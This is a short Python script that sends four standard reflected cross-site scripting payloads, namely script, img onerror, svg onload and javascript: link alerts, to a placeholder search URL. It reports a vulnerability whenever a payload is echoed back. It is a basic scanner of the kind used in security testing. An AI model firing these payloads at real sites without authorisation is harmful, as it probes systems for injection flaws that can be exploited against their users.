import requests

# Target URL of the web application
url = 'http://example.com/search'  # Replace with the actual URL where input is rendered

# List of XSS payloads
payloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<a href="javascript:alert(\'XSS\')">Click me</a>'
]

# Loop through payloads and send requests
for payload in payloads:
    print(f"Testing with payload: {payload}")
    # Assuming the parameter name is "q" (query), adjust as necessary
    params = {'q': payload}
    response = requests.get(url, params=params)
    
    # Check for JavaScript execution (usually the response will contain the injected script)
    if payload in response.text:
        print(f"XSS vulnerability found with payload: {payload}")
    else:
        print(f"No XSS vulnerability found with payload: {payload}")
